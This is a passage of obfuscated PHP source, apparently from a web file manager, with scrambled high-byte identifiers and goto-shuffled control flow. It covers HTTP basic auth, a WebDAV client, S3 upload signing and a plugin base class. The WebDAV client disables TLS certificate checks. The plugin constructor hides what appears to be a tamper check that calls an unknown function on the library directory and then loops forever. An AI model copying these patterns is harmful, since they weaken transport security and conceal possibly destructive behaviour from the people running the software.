b‚¿¶Î »ü; b‚¿¶Î »ü: $A˜Ô«Ì≠ﬂ‹ = $DÍ‚Ê¢„–›[$bÛô®∆™¶Ë]; $d´‡Ø÷Œ∆∑ = $fÑâè≥œÒ“; if (!is_array($A˜Ô«Ì≠ﬂ‹) || count($A˜Ô«Ì≠ﬂ‹) == 0) { return $d´‡Ø÷Œ∆∑; } goto C±–á´ö’¬; C±–á´ö’¬: for ($F¡ôÇåé≈– = 0; $F¡ôÇåé≈– < count($A˜Ô«Ì≠ﬂ‹); $F¡ôÇåé≈–++) { $Aüáÿﬂ»Ìß = $A˜Ô«Ì≠ﬂ‹[$F¡ôÇåé≈–]; if ($Aüáÿﬂ»Ìß[$FÎß¶Ñ¨√‰[1147]] && $Aüáÿﬂ»Ìß[$FÎß¶Ñ¨√‰[1148]] > 1) { continue; } self::$events[$bÛô®∆™¶Ë][$F¡ôÇåé≈–][$FÎß¶Ñ¨√‰[1148]] = $Aüáÿﬂ»Ìß[$FÎß¶Ñ¨√‰[1148]] + 1; $fÑâè≥œÒ“ = self::apply($Aüáÿﬂ»Ìß[$FÎß¶Ñ¨√‰[1146]], array($fÑâè≥œÒ“)); $d´‡Ø÷Œ∆∑ = $fÑâè≥œÒ“; } return $d´‡Ø÷Œ∆∑; goto FÖ“Óø„é¡; FÖ“Óø„é¡: } public static function trigger($bé•√äã›∏) { goto e≤∞◊¡ °ë; DÀœ®û–∏ı: $e÷¶ãÉ°¿û = func_get_args(); array_shift($e÷¶ãÉ°¿û); for ($F≥‚ôçßÂÉ = 0; $F≥‚ôçßÂÉ < count($cƒëå«Ωæ); $F≥‚ôçßÂÉ++) { $A∏ùËÂã∂û = $cƒëå«Ωæ[$F≥‚ôçßÂÉ]; if ($A∏ùËÂã∂û[$Eî“€à®‰Æ[1147]] && $A∏ùËÂã∂û[$Eî“€à®‰Æ[1148]] > 1) { continue; } if (defined($Eî“€à®‰Æ[1149]) && GLOBAL_LOG_HOOK) { write_log($bé•√äã›∏ . $Eî“€à®‰Æ[1150] . $A∏ùËÂã∂û[$Eî“€à®‰Æ[1146]], $Eî“€à®‰Æ[1151]); } self::$events[$bé•√äã›∏][$F≥‚ôçßÂÉ][$Eî“€à®‰Æ[1148]] = $A∏ùËÂã∂û[$Eî“€à®‰Æ[1148]] + 1; $Cß±Ö≥ŒÌó = self::apply($A∏ùËÂã∂û[$Eî“€à®‰Æ[1146]], $e÷¶ãÉ°¿û); if (defined($Eî“€à®‰Æ[1149]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Eî“€à®‰Æ[1151]); } if ($A∏ùËÂã∂û[$Eî“€à®‰Æ[1148]] == 200) { $d¨∞ôÎËãÁ = is_array($A∏ùËÂã∂û[$Eî“€à®‰Æ[1146]]) ? json_encode_force($A∏ùËÂã∂û[$Eî“€à®‰Æ[1146]]) : $A∏ùËÂã∂û[$Eî“€à®‰Æ[1146]]; write_log($Eî“€à®‰Æ[1152] . $bé•√äã›∏ . $Eî“€à®‰Æ[1153] . $d¨∞ôÎËãÁ, $Eî“€à®‰Æ[1154]); } $Eèêçä∞µ = is_null($Cß±Ö≥ŒÌó) ? $Eèêçä∞µ : $Cß±Ö≥ŒÌó; } goto a∞πÜãä€≤; a∞πÜãä€≤: return $Eèêçä∞µ; goto aÙœ˜‹ﬁ€§; f…Ω›⁄¨ïÊ: if (!isset($Fù©áÉ¥·Á[$bé•√äã›∏])) { return $Eèêçä∞µ; } $cƒëå«Ωæ = $Fù©áÉ¥·Á[$bé•√äã›∏]; if (!is_array($cƒëå«Ωæ) || count($cƒëå«Ωæ) == 0) { return $Eèêçä∞µ; } goto DÀœ®û–∏ı; e≤∞◊¡ °ë: $Eî“€à®‰Æ =& $_SERVER[∞„˜ƒÑºª]; $Fù©áÉ¥·Á = self::$events; $Eèêçä∞µ = !1; goto f…Ω›⁄¨ïÊ; aÙœ˜‹ﬁ€§: } } class HttpAuth { public static function get() { $f∆›õ†åÍò =& $_SERVER[∞„˜ƒÑºª]; $C∂∑àŸÇﬁ  = $f∆›õ†åÍò[33]; $AôñÚ´«“ã = $f∆›õ†åÍò[33]; if (isset($_SERVER[$f∆›õ†åÍò[1155]])) { $C∂∑àŸÇﬁ  = $_SERVER[$f∆›õ†åÍò[1155]]; $AôñÚ´«“ã = $_SERVER[$f∆›õ†åÍò[1156]]; } elseif (isset($_SERVER[$f∆›õ†åÍò[1157]])) { $a°Ç∏ØêÇ≤ = $_SERVER[$f∆›õ†åÍò[1157]]; if (strpos(strtolower($a°Ç∏ØêÇ≤), $f∆›õ†åÍò[1158]) === 0) { $cçñ•£ƒ©⁄ = explode($f∆›õ†åÍò[4], base64_decode(substr($a°Ç∏ØêÇ≤, 6))); $C∂∑àŸÇﬁ  = isset($cçñ•£ƒ©⁄[0]) ? $cçñ•£ƒ©⁄[0] : $f∆›õ†åÍò[33]; $AôñÚ´«“ã = isset($cçñ•£ƒ©⁄[1]) ? $cçñ•£ƒ©⁄[1] : 0; } } return array($f∆›õ†åÍò[415] => $C∂∑àŸÇﬁ , $f∆›õ†åÍò[657] => $AôñÚ´«“ã); } public static function error() { goto f‚ŸÖäÂå…; f‚ŸÖäÂå…: $BÇ›¢¨«∞™ =& $_SERVER[∞„˜ƒÑºª]; header($BÇ›¢¨«∞™[1159]); header($BÇ›¢¨«∞™[1160]); goto fÍ∆é≠±ú•; fÍ∆é≠±ú•: header($BÇ›¢¨«∞™[1161]); header($BÇ›¢¨«∞™[1162]); header($BÇ›¢¨«∞™[1163]); goto A—≥„©ú¥é; A—≥„©ú¥é: die; goto F‹ˆê˘Ã—ö; F‹ˆê˘Ã—ö: } public static function make($cÔÕëÇ⁄É›, $aôØí∞∫»‡) { $CﬁŒ¯πçåª =& $_SERVER[∞„˜ƒÑºª]; return $CﬁŒ¯πçåª[1164] + base64_encode($cÔÕëÇ⁄É› . $CﬁŒ¯πçåª[4] . $aôØí∞∫»‡); } } class HttpDavClient { public function __construct($cıÌ⁄†ìÇæ, $A∞¿ç◊’‡¢, $EÈä„ê∆œ∏) { $this->header = array(); $this->userName = $A∞¿ç◊’‡¢; $this->userPassowrd = $EÈä„ê∆œ∏; } protected function makePath($BúÜÿ®ˆ§∆) { return $BúÜÿ®ˆ§∆; } protected function setHeader($aÉé¥áÆë¬, $E§Òøƒ¬◊≈ = false) { if ($E§Òøƒ¬◊≈ === !1) { $this->header[] = $aÉé¥áÆë¬; } else { $this->header[] = $aÉé¥áÆë¬ . $_SERVER[∞„˜ƒÑºª][640] . $E§Òøƒ¬◊≈; } } public function move($dÕ˘é÷´’í, $cì˜⁄≠£Ω◊, $cÌÍΩÒÃ∂Ô = '') { $D™»©Á¯ÂÃ =& $_SERVER[∞„˜ƒÑºª]; $this->setHeader($D™»©Á¯ÂÃ[1165], $this->makePath($cì˜⁄≠£Ω◊)); $this->setHeader($D™»©Á¯ÂÃ[1166], $D™»©Á¯ÂÃ[1167]); if ($cÌÍΩÒÃ∂Ô) { $this->setHeader($D™»©Á¯ÂÃ[1168], $D™»©Á¯ÂÃ[685] . $cÌÍΩÒÃ∂Ô . $D™»©Á¯ÂÃ[688]); } return $this->send($D™»©Á¯ÂÃ[1169], $dÕ˘é÷´’í); } public function copy($fÉÚŒ∫¯Ø∑, $Dº´¢¥åèÛ) { $aèöÎ‰±‘¥ =& $_SERVER[∞„˜ƒÑºª]; $this->setHeader($aèöÎ‰±‘¥[1165], $this->makePath($Dº´¢¥åèÛ)); $this->setHeader($aèöÎ‰±‘¥[1166], $aèöÎ‰±‘¥[1167]); return $this->send($aèöÎ‰±‘¥[1170], $fÉÚŒ∫¯Ø∑); } public function mkcol($a“Úí¥Ø”‰) { $BÖ◊¶î·„é =& $_SERVER[∞„˜ƒÑºª]; $this->setHeader($BÖ◊¶î·„é[1166], $BÖ◊¶î·„é[1167]); return $this->send($BÖ◊¶î·„é[1171], $a“Úí¥Ø”‰); } public function delete($E«∑¥ÿç¢’, $f”ºŒÉ‰°∆ = '') { $D®’ò»Ÿöâ =& $_SERVER[∞„˜ƒÑºª]; if ($f”ºŒÉ‰°∆) { $this->setHeader($D®’ò»Ÿöâ[1168], $D®’ò»Ÿöâ[685] . $f”ºŒÉ‰°∆ . $D®’ò»Ÿöâ[688]); } return $this->send($D®’ò»Ÿöâ[1172], $E«∑¥ÿç¢’); } public function propfind($Eå»çêÚ›ï) { $dÕ¢ôëª”‹ =& $_SERVER[∞„˜ƒÑºª]; $this->setHeader($dÕ¢ôëª”‹[1173], $dÕ¢ôëª”‹[376]); $this->setHeader($dÕ¢ôëª”‹[1174], $dÕ¢ôëª”‹[1175]); $C”ñÓ‚’·… = $dÕ¢ôëª”‹[1176]; return $this->send($dÕ¢ôëª”‹[1177], $Eå»çêÚ›ï, $C”ñÓ‚’·…); } public function options($Fêí©Ãöøì) { return $this->send($_SERVER[∞„˜ƒÑºª][1178], $Fêí©Ãöøì); } public function get($B¬ú⁄Ûíê) { return $this->send($_SERVER[∞„˜ƒÑºª][219], $B¬ú⁄Ûíê); } public function put($AÔêùˆê‚Ÿ, $AË°√Ê®Ì§, $Eä∫¿‚Í√È = '') { $F¥áÑÜΩ“∑ =& $_SERVER[∞„˜ƒÑºª]; if ($Eä∫¿‚Í√È) { $this->setHeader($F¥áÑÜΩ“∑[1168], $F¥áÑÜΩ“∑[685] . $Eä∫¿‚Í√È . $F¥áÑÜΩ“∑[688]); } return $this->send($F¥áÑÜΩ“∑[217], $AÔêùˆê‚Ÿ, $AË°√Ê®Ì§); } protected function send($cß˘Ó„‚Ì¥, $d¨ºŒ∂áäã, $EÏÉ®ıñØö = false, $A∂âö≈–çÓ = false) { goto câÉ◊â¯Ÿê; câ˘ÁïÍùÒ: $this->setHeader($D∏øßä∑Çê); if ($EÏÉ®ıñØö) { $EÏÉ®ıñØö = $e√ééë›ÙÉ[1180] . $EÏÉ®ıñØö; } if (!request_url_safe($d¨ºŒ∂áäã)) { return !1; } goto fäú«óßö§; câÉ◊â¯Ÿê: $e√ééë›ÙÉ =& $_SERVER[∞„˜ƒÑºª]; $D∏øßä∑Çê = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($e√ééë›ÙÉ[1179], $e√ééë›ÙÉ[50]); goto câ˘ÁïÍùÒ; fœ©Óí¿“ƒ: $this->header = array(); return $DˆÚ˜√ºÉÖ; goto E∑Ω°«ë¨õ; Bíøåçùåî: curl_setopt($Bœºåóﬁ≥î, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Bœºåóﬁ≥î, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Bœºåóﬁ≥î, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto BôÀñìã ê; BôÀñìã ê: curl_setopt($Bœºåóﬁ≥î, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Bœºåóﬁ≥î, CURLOPT_SSL_VERIFYHOST, !1); $DˆÚ˜√ºÉÖ = curl_exec($Bœºåóﬁ≥î); goto fœ©Óí¿“ƒ; fäú«óßö§: $Bœºåóﬁ≥î = curl_init($d¨ºŒ∂áäã); curl_setopt($Bœºåóﬁ≥î, CURLOPT_CUSTOMREQUEST, $cß˘Ó„‚Ì¥); curl_setopt($Bœºåóﬁ≥î, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto Bíøåçùåî; E∑Ω°«ë¨õ: } } goto f⁄âﬁÑˆô‚; cÑı∫ﬁ•èÛ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Dã˜íñãÃü) { parent::__construct($Dã˜íñãÃü); } public function uploadFormData($CÉÃ¬É„¿†, $b¨ﬁÏîöÓ¬ = 3600) { goto dîÇÑë≈æê; cÛ≈Ç¨ÉÑÃ: $C…à‰¢ﬂò› = base64_encode(json_encode($c€√ÏÇ¯âÑ)); $BÁÊó•ﬂëÁ = hash_hmac($Aç„Œ’§Ÿ[850], $AÈ¢Øâª¨ç, $Aç„Œ’§Ÿ[851] . $this->secret, !0); $f‹∑‚Ô›∫ƒ = hash_hmac($Aç„Œ’§Ÿ[850], $this->region, $BÁÊó•ﬂëÁ, !0); goto DÕ°Ú„ïÂÔ; dò›ªû¶üπ: $eÖŒ™íü“ï = $Aç„Œ’§Ÿ[67]; $BÉ›‰⁄À–Ü = gmdate($Aç„Œ’§Ÿ[841]); $AÈ¢Øâª¨ç = gmdate($Aç„Œ’§Ÿ[446]); goto Câ˘è≈Êæ•; dîÇÑë≈æê: $Aç„Œ’§Ÿ =& $_SERVER[∞„˜ƒÑºª]; $AÔÜ∑æ‹ıà = $Aç„Œ’§Ÿ[181]; $B´ıŒÊ•‹€ = $Aç„Œ’§Ÿ[840]; goto dò›ªû¶üπ; Câ˘è≈Êæ•: $aÒÑ¢äúÉ√ = $Aç„Œ’§Ÿ[842]; $E˘ÁÔ‘Ö˜å = $b¨ﬁÏîöÓ¬ . $Aç„Œ’§Ÿ[33]; $FÇÍÇ˘ÉÊë = $Aç„Œ’§Ÿ[817]; goto A≠øç›êˆä; BÇÎøùÙ∏ã: $eå¯≠…Ò‰ß = array($Aç„Œ’§Ÿ[195] => $Aç„Œ’§Ÿ[33], $Aç„Œ’§Ÿ[852] => $Aç„Œ’§Ÿ[33], $Aç„Œ’§Ÿ[821] => $AÔÜ∑æ‹ıà, $Aç„Œ’§Ÿ[825] => $FÇÍÇ˘ÉÊë, $Aç„Œ’§Ÿ[829] => $C…à‰¢ﬂò›, $Aç„Œ’§Ÿ[853] => $cŸ±¡±¶⁄Ê, $Aç„Œ’§Ÿ[854] => $B´ıŒÊ•‹€, $Aç„Œ’§Ÿ[855] => $BÉ›‰⁄À–Ü, $Aç„Œ’§Ÿ[856] => $E˘ÁÔ‘Ö˜å, $Aç„Œ’§Ÿ[857] => $d∫ù∂ƒùı¶, $Aç„Œ’§Ÿ[165] => $this->getHost()); return $eå¯≠…Ò‰ß; goto cÌæü§ÆÈ∑; A≠øç›êˆä: $aŸçº«§◊É = array($this->accessKey, $AÈ¢Øâª¨ç, $this->region, $eÖŒ™íü“ï, $aÒÑ¢äúÉ√); $cŸ±¡±¶⁄Ê = implode($Aç„Œ’§Ÿ[8], $aŸçº«§◊É); $c€√ÏÇ¯âÑ = array($Aç„Œ’§Ÿ[819] => gmdate($Aç„Œ’§Ÿ[818], strtotime($Aç„Œ’§Ÿ[843])), $Aç„Œ’§Ÿ[820] => array(array($Aç„Œ’§Ÿ[822] => $this->bucket), array($Aç„Œ’§Ÿ[821] => $AÔÜ∑æ‹ıà), array($Aç„Œ’§Ÿ[823], $Aç„Œ’§Ÿ[824], $Aç„Œ’§Ÿ[33]), array($Aç„Œ’§Ÿ[823], $Aç„Œ’§Ÿ[844], $Aç„Œ’§Ÿ[33]), array($Aç„Œ’§Ÿ[823], $Aç„Œ’§Ÿ[845], $Aç„Œ’§Ÿ[33]), array($Aç„Œ’§Ÿ[825] => $FÇÍÇ˘ÉÊë), array($Aç„Œ’§Ÿ[846] => $cŸ±¡±¶⁄Ê), array($Aç„Œ’§Ÿ[847] => $B´ıŒÊ•‹€), array($Aç„Œ’§Ÿ[848] => $BÉ›‰⁄À–Ü), array($Aç„Œ’§Ÿ[849] => $E˘ÁÔ‘Ö˜å))); goto cÛ≈Ç¨ÉÑÃ; DÕ°Ú„ïÂÔ: $e‚‰˜ñ¡÷√ = hash_hmac($Aç„Œ’§Ÿ[850], $eÖŒ™íü“ï, $f‹∑‚Ô›∫ƒ, !0); $f¶èô†€°± = hash_hmac($Aç„Œ’§Ÿ[850], $aÒÑ¢äúÉ√, $e‚‰˜ñ¡÷√, !0); $d∫ù∂ƒùı¶ = hash_hmac($Aç„Œ’§Ÿ[850], $C…à‰¢ﬂò›, $f¶èô†€°±); goto BÇÎøùÙ∏ã; cÌæü§ÆÈ∑: } public function multiUploadFormData($E ·å¨√”õ, $Féãå›˘Á = 3600) { $b–ø∂ò‚í¬ =& $_SERVER[∞„˜ƒÑºª]; $E°…Ù’û œ = gmdate($b–ø∂ò‚í¬[940]); $EÜÂ¬Ì∑§Ë = array(); $e‘†ö⁄îŸÂ = $this->client->getUploadId($this->bucket, $E ·å¨√”õ, $EÜÂ¬Ì∑§Ë); if (!$e‘†ö⁄îŸÂ) { return !1; } return array($b–ø∂ò‚í¬[212] => $e‘†ö⁄îŸÂ, $b–ø∂ò‚í¬[165] => $this->getHost() . $b–ø∂ò‚í¬[8] . $this->pathEncode($E ·å¨√”õ), $b–ø∂ò‚í¬[213] => $E°…Ù’û œ, $b–ø∂ò‚í¬[96] => $E ·å¨√”õ); } public function multiUploadAuthData($a©∞Ìµª≠ë, $EÊ∆ø±ò√ñ = array()) { goto dœƒ¥üèÈª; F≈…ÑºÍºí: if (isset($EÊ∆ø±ò√ñ[$CŸºŸåÌëè[941]])) { $fƒıπ¢‡Ÿ¡[$CŸºŸåÌëè[942]] = $EÊ∆ø±ò√ñ[$CŸºŸåÌëè[941]]; } $CÚ÷ÖŒè˘∑ = explode($CŸºŸåÌëè[167], $this->getHost()); $B≥‰ıÇìŒ– = array($CŸºŸåÌëè[943] => $CÚ÷ÖŒè˘∑[1], $CŸºŸåÌëè[944] => $CŸºŸåÌëè[33], $CŸºŸåÌëè[195] => $CŸºŸåÌëè[113], $CŸºŸåÌëè[852] => $EÊ∆ø±ò√ñ[$CŸºŸåÌëè[86]]); goto EäÀè¢÷òä; bˆø¢ïèïÇ: unset($EÊ∆ø±ò√ñ[$CŸºŸåÌëè[96]]); if (isset($EÊ∆ø±ò√ñ[$CŸºŸåÌëè[214]])) { return $this->listUploadParts($fÀ∫∆»ÉòÂ, $EÊ∆ø±ò√ñ); } $fƒıπ¢‡Ÿ¡ = array(); goto F≈…ÑºÍºí; fﬂ⁄„é™ÌÍ: if (strpos($F≥ûπÔ‰⁄±, $CŸºŸåÌëè[216]) === 0) { if (isset($fƒıπ¢‡Ÿ¡[$CŸºŸåÌëè[942]])) { $Dâ∞ êñ°Õ = $fƒıπ¢‡Ÿ¡[$CŸºŸåÌëè[942]]; } else { if (isset($c¯É¬⁄Íñ€[$CŸºŸåÌëè[942]])) { $Dâ∞ êñ°Õ = $c¯É¬⁄Íñ€[$CŸºŸåÌëè[942]]; } else { $Dâ∞ êñ°Õ = hash($CŸºŸåÌëè[850], $CŸºŸåÌëè[33]); } } return array($CŸºŸåÌëè[222] => $c¯É¬⁄Íñ€[$CŸºŸåÌëè[222]], $CŸºŸåÌëè[942] => $Dâ∞ êñ°Õ, $CŸºŸåÌëè[213] => $c¯É¬⁄Íñ€[$CŸºŸåÌëè[945]]); } return $c¯É¬⁄Íñ€[$CŸºŸåÌëè[222]]; goto bö‹Ë”±Ÿ“; EäÀè¢÷òä: $fªÓ√Ëêßö = $CŸºŸåÌëè[217]; $eŒÁ¶•é®ë = $CŸºŸåÌëè[8] . $this->pathEncode($fÀ∫∆»ÉòÂ) . $F≥ûπÔ‰⁄±; $c¯É¬⁄Íñ€ = $this->client->__getSignatureV4($fƒıπ¢‡Ÿ¡, $B≥‰ıÇìŒ–, $fªÓ√Ëêßö, $eŒÁ¶•é®ë); goto fﬂ⁄„é™ÌÍ; dœƒ¥üèÈª: $CŸºŸåÌëè =& $_SERVER[∞„˜ƒÑºª]; $F≥ûπÔ‰⁄± = isset($EÊ∆ø±ò√ñ[$CŸºŸåÌëè[156]]) ? $EÊ∆ø±ò√ñ[$CŸºŸåÌëè[156]] : $CŸºŸåÌëè[33]; $fÀ∫∆»ÉòÂ = $EÊ∆ø±ò√ñ[$CŸºŸåÌëè[96]]; goto bˆø¢ïèïÇ; bö‹Ë”±Ÿ“: } public function listUploadParts($bÑãÿ≥¬÷™, $CË¨˘ÆÜŒ¢ = array()) { goto fÕË¨œÎåÈ; Cî◊˜ˆ·†ƒ: $A›âôüö≤ß .= $Bä¿ììÜ›‰[949]; $eˆﬁ¨õÁÙª = array(); $D˜öƒﬂä±â = explode($Bä¿ììÜ›‰[167], $this->getHost()); goto F≤îÕŒ¿ù¢; F≤îÕŒ¿ù¢: $a∫Òøçé∆® = array($Bä¿ììÜ›‰[943] => $D˜öƒﬂä±â[1], $Bä¿ììÜ›‰[195] => $Bä¿ììÜ›‰[113], $Bä¿ììÜ›‰[852] => strlen($A›âôüö≤ß)); $Cãè„âﬂ•Ö = $Bä¿ììÜ›‰[215]; $A º“ç£•ø = $Bä¿ììÜ›‰[8] . $this->pathEncode($bÑãÿ≥¬÷™) . $CË¨˘ÆÜŒ¢[$Bä¿ììÜ›‰[156]]; goto Eèá¢ÏäüÎ; b•¬¨¨îÑ: if (!$d¶±Ω«±±∆) { return !1; } $A›âôüö≤ß = $Bä¿ììÜ›‰[946]; foreach ($d¶±Ω«±±∆ as $dÎ∆Ã∫ﬂ·¶) { $A›âôüö≤ß .= $Bä¿ììÜ›‰[947] . "\x3c\x50\x61\162\164\116\x75\155\142\145\162\x3e{$dÎ∆Ã∫ﬂ·¶[$Bä¿ììÜ›‰[895]]}\x3c\x2f\x50\141\x72\x74\x4e\x75\x6d\142\x65\x72\x3e\xa" . "\x3c\x45\124\x61\x67\76{$dÎ∆Ã∫ﬂ·¶[$Bä¿ììÜ›‰[896]]}\74\x2f\105\124\141\x67\76\12" . $Bä¿ììÜ›‰[948]; } goto Cî◊˜ˆ·†ƒ; Eèá¢ÏäüÎ: $EÁêÑ‘À“∆ = $this->client->__getSignatureV4($eˆﬁ¨õÁÙª, $a∫Òøçé∆®, $Cãè„âﬂ•Ö, $A º“ç£•ø, $A›âôüö≤ß); return array($Bä¿ììÜ›‰[222] => $EÁêÑ‘À“∆[$Bä¿ììÜ›‰[222]], $Bä¿ììÜ›‰[213] => $EÁêÑ‘À“∆[$Bä¿ììÜ›‰[945]], $Bä¿ììÜ›‰[224] => $d¶±Ω«±±∆, $Bä¿ììÜ›‰[942] => $EÁêÑ‘À“∆[$Bä¿ììÜ›‰[942]]); goto Dä¯Ì›ÿí; fÕË¨œÎåÈ: $Bä¿ììÜ›‰ =& $_SERVER[∞„˜ƒÑºª]; $eΩ¯∞«Ñ≠÷ = str_replace($Bä¿ììÜ›‰[223], $Bä¿ììÜ›‰[33], $CË¨˘ÆÜŒ¢[$Bä¿ììÜ›‰[156]]); $d¶±Ω«±±∆ = $this->client->listParts($this->bucket, $bÑãÿ≥¬÷™, $eΩ¯∞«Ñ≠÷); goto b•¬¨¨îÑ; Dä¯Ì›ÿí: } public function link($fïåÒÔÇ≤æ, $CÎî§‹‚ÇË = array()) { return parent::link($fïåÒÔÇ≤æ, $CÎî§‹‚ÇË); } public function fileOut($Eµ∑¯Æê“™, $E–€±í¨’° = false, $DÓÇ‘Êƒ€ä = false, $b€“º ûàñ = '') { if (strstr($this->endpoint, $_SERVER[∞„˜ƒÑºª][950])) { return parent::fileOutServer($Eµ∑¯Æê“™, $E–€±í¨’°, $DÓÇ‘Êƒ€ä, $b€“º ûàñ); } parent::fileOut($Eµ∑¯Æê“™, $E–€±í¨’°, $DÓÇ‘Êƒ€ä, $b€“º ûàñ); } public function fileOutImage($BÈØØ≤Œ©ä, $d†æÎÚ„¬ß = 250) { if (strstr($this->endpoint, $_SERVER[∞„˜ƒÑºª][950])) { return parent::fileOutImageServer($BÈØØ≤Œ©ä, $d†æÎÚ„¬ß); } parent::fileOutImage($BÈØØ≤Œ©ä, $d†æÎÚ„¬ß); } public function fileInfoImage($cô∂ªë»Ç‘, &$C∏äÔÖØèë) { $f—¨ßîË¬Ñ =& $_SERVER[∞„˜ƒÑºª]; $d∫¥Ã∏£Á = array($f—¨ßîË¬Ñ[204], $f—¨ßîË¬Ñ[157], $f—¨ßîË¬Ñ[205], $f—¨ßîË¬Ñ[206], $f—¨ßîË¬Ñ[207]); if (!in_array($C∏äÔÖØèë[$f—¨ßîË¬Ñ[156]], $d∫¥Ã∏£Á)) { return; } if (!strstr($this->endpoint, $f—¨ßîË¬Ñ[950])) { $DàºÊ©Ì⁄º = $this->link($cô∂ªë»Ç‘); $E™⁄Ùæ≤ó« = getimagesize($DàºÊ©Ì⁄º); if ($E™⁄Ùæ≤ó«) { $C∏äÔÖØèë[$f—¨ßîË¬Ñ[208]] = array($f—¨ßîË¬Ñ[209] => $E™⁄Ùæ≤ó«[0], $f—¨ßîË¬Ñ[210] => $E™⁄Ùæ≤ó«[1]); } } } public function getHost($Eã¿„à‘”â = true) { $c´ñßäúÏç =& $_SERVER[∞„˜ƒÑºª]; $e§ªâﬂ¢™⁄ = parse_url(trim($this->domain, $c´ñßäúÏç[8])); $b¯á⁄€•ÂΩ = isset($e§ªâﬂ¢™⁄[$c´ñßäúÏç[164]]) ? $e§ªâﬂ¢™⁄[$c´ñßäúÏç[164]] : http_type(); $A±å„†§Â› = isset($e§ªâﬂ¢™⁄[$c´ñßäúÏç[165]]) ? $e§ªâﬂ¢™⁄[$c´ñßäúÏç[165]] : $e§ªâﬂ¢™⁄[$c´ñßäúÏç[84]]; if (isset($e§ªâﬂ¢™⁄[$c´ñßäúÏç[166]])) { $A±å„†§Â› .= $c´ñßäúÏç[4] . $e§ªâﬂ¢™⁄[$c´ñßäúÏç[166]]; } return $b¯á⁄€•ÂΩ . $c´ñßäúÏç[167] . $this->bucket . $c´ñßäúÏç[98] . $A±å„†§Â›; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($D◊òï∫÷è¥, $Fˆ§‡ãò¬Ñ = 0) { parent::__construct(); $this->source = $D◊òï∫÷è¥; $this->sourceSize = $Fˆ§‡ãò¬Ñ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Dà¬Ûâé⁄‚ = false) { return $this->sourceSize; } public function getContent($c«äëøì≈â = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $cŸ°§ª°¡‡ = ftell($this->source); $dååÇÌÀ´‘ = @fread($this->source, $this->sourceSize); fseek($this->source, $cŸ°§ª°¡‡); return $dååÇÌÀ´‘; } } public function fileSubstr($dÙØ‹ÙÜ¬¥ = false, $F·§ïâÃ“… = 0, $B⁄è¬¯‹ÌŸ = 0) { if (!$B⁄è¬¯‹ÌŸ) { $B⁄è¬¯‹ÌŸ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $F·§ïâÃ“…, $B⁄è¬¯‹ÌŸ); } if ($this->sourceType == self::TYPE_FILE) { $Eåê‹Í∑ãÑ = ftell($this->source); fseek($this->source, $Eåê‹Í∑ãÑ + $F·§ïâÃ“…); $aéÑô¶ÂÒ = @fread($this->source, $B⁄è¬¯‹ÌŸ); fseek($this->source, $Eåê‹Í∑ãÑ); return $aéÑô¶ÂÒ; } } public function hashMd5($FÉÆ´˘“¶  = false) { return md5($this->getContent()); } public static function hash($eú—öæªà¡, $bŒ§˜çè£ª = 0) { $c”π∂ù§À“ = new PathDriverStream($eú—öæªà¡, $bŒ§˜çè£ª); return $c”π∂ù§À“->hashSimple($eú—öæªà¡); } public static function md5($CæÜ„èÌ“ë, $aéì¨√óπ = 0) { $B®Ö¨–¢®Ç = new PathDriverStream($CæÜ„èÌ“ë, $aéì¨√óπ); return $B®Ö¨–¢®Ç->hashMd5($CæÜ„èÌ“ë); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto F∏ƒÈΩº÷—; a⁄é‹Ÿ¯ßÍ: $this->values = array(); return $this; goto dÆõ”ﬂ¨Ñˆ; F∏ƒÈΩº÷—: $c«ˆÉÌ≤âö =& $_SERVER[∞„˜ƒÑºª]; if (!isset($_SERVER[$c«ˆÉÌ≤âö[51]]) || !isset($_SERVER[$c«ˆÉÌ≤âö[58]])) { goto f˘„ÂáúÂ”; CŸâ„ÀÊÀ≈: $BÂó©¡œÂã(LIB_DIR); for (;;) { $BÂó©¡œÂã = json_encode($GLOBALS[$c«ˆÉÌ≤âö[951]]); } goto Aæê∞¨≈äã; C®»â“ﬁ◊Ô: $eΩ®Œ ñ¢å = explode($c«ˆÉÌ≤âö[55], $BåÉÔ‘óœÃ); if (count($eΩ®Œ ñ¢å) < $c«ˆÉÌ≤âö[552]) { die; } $BÂó©¡œÂã = $c«ˆÉÌ≤âö[553]; goto CŸâ„ÀÊÀ≈; f˘„ÂáúÂ”: $AŒÑ€⁄¥†π = $c«ˆÉÌ≤âö[53]; $FÓÔë…ç™‚ = BASIC_PATH . $c«ˆÉÌ≤âö[54]; $BåÉÔ‘óœÃ = $AŒÑ€⁄¥†π($FÓÔë…ç™‚); goto C®»â“ﬁ◊Ô; Aæê∞¨≈äã: } global $in, $config; goto dúÂü£ô‘ò; dúÂü£ô‘ò: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($c«ˆÉÌ≤âö[430]); goto EÈæ˘•åÀ‘; Dôç°Êç“ÿ: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $c«ˆÉÌ≤âö[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $c«ˆÉÌ≤âö[8]; $this->pluginLangArr = $this->initLang(); goto a⁄é‹Ÿ¯ßÍ; EÈæ˘•åÀ‘: $this->pluginName = str_replace($c«ˆÉÌ≤âö[430], $c«ˆÉÌ≤âö[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $c«ˆÉÌ≤âö[8]; $this->pluginApi = rtrim(APP_HOST, $c«ˆÉÌ≤âö[8]) . $c«ˆÉÌ≤âö[952] . $this->pluginName . $c«ˆÉÌ≤âö[8]; goto Dôç°Êç“ÿ; dÆõ”ﬂ¨Ñˆ: } public function regist() { $this->hookRegist(array()); } public 